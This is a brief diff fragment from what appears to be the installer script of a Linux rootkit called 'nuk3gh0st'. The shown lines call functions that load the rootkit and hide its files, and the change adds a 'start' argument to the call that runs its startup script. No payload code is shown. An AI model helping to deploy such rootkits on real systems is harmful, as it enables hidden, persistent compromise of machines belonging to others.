@@ -47,4 +47,4 @@ function print_hide_rootkit_files {
 print_banner
 print_load_rootkit
 print_hide_rootkit_files
-bash /usr/share/nuk3gh0st/nuk3gh0st.startup
+bash /usr/share/nuk3gh0st/nuk3gh0st.startup start
